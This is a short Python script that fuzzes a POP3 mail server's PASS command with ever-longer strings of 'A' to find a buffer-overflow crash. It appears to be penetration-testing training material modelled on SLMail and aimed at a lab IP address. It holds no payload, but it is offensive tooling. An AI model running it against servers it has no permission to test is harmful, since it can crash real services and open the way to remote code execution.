#!/usr/share/python

import socket
from pwn import *
import time

def Fuzzer():

	buffer = ["A"]
	counter = 500
	while len(buffer) <= 100:
		buffer.append("A" * counter)
		counter = counter + 500
	try:
		# Used SLMail as template here, adjust accordingly!
		r = remote('192.168.199.140', 110)
		r.recv(2048)

		for string in buffer:
			print "Fuzzing with %s bytes of payload" %len(string)
			r.send('USER username\r\n')
			r.recv(2048)
			r.send('PASS ' + string + '\r\n')
			r.recv(2048)
			time.sleep(1)
	except:
		print "Couldn't connect to target, or you hit the jackpot!"


def main():

	print (
	'''
	 _______ _______ _______ _______ _______ _______
	|\     /|\     /|\     /|\     /|\     /|\     /|
	| +---+ | +---+ | +---+ | +---+ | +---+ | +---+ |
	| |   | | |   | | |   | | |   | | |   | | |   | |
	| |F  | | |u  | | |z  | | |z  | | |M  | | |e  | |
	| +---+ | +---+ | +---+ | +---+ | +---+ | +---+ |
	|/_____\|/_____\|/_____\|/_____\|/_____\|/_____\|
	by @ihack4falafel
	'''
	)

	Fuzzer()

if __name__ == '__main__':
	main()